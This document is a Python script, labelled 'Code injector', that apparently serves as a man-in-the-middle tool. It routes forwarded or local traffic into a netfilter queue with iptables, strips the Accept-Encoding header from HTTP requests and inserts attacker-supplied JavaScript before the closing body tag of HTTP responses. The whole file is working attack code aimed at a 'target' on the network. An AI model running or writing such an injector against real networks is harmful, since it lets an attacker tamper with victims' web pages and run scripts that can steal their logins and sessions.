import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse
import re


def get_arguments():
    parser = argparse.ArgumentParser(description='Code injector')
    parser.add_argument('-c' , '--code' , nargs='?' , dest='code' , help= "Code to inject" , required=True)
    parser.add_argument('--local', dest='local', action='store_const', const=True , help='Spoof in your Computer , default=target')
    args = parser.parse_args()
    return args


def set_load(packet , load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
                     
            


def change_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer('Raw'):
        if scapy_packet[scapy.TCP].dport == 80:
            print('[+] HTTP REQUEST')
            modified_load =  re.sub("Accept-Encoding:.*?\\r\\n" , "" , scapy_packet[scapy.Raw].load.decode())
            new_packet = set_load(scapy_packet , modified_load)
            packet.set_payload(bytes(new_packet))
                
            print(scapy_packet.show())

        if scapy_packet[scapy.TCP].sport == 80:
            print('[+] HTTP RESPONSE')
            modified_load = scapy_packet[scapy.Raw].load.decode().replace("</body>" , f'<script>{result.code};</script></body>')
            new_packet = set_load(scapy_packet , modified_load)
            packet.set_payload(bytes(new_packet))
            
            print(scapy_packet.show())

    packet.accept()
   

def process():
    if result.local:
        commandone = 'iptables -I OUTPUT -j NFQUEUE --queue-num 0'
        commandtwo = 'iptables -I INPUT -j NFQUEUE --queue-num 0'
        subprocess.run([commandone] , shell=True)
        subprocess.run([commandtwo] , shell=True)
    else:
        command = 'iptables -I FORWARD -j NFQUEUE --queue-num 0'
        subprocess.run([command] , shell=True)

    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0 , change_packet)
        queue.run()
    except:
        command = 'iptables --flush'
        subprocess.run([command] , shell=True)

result = get_arguments()
process()


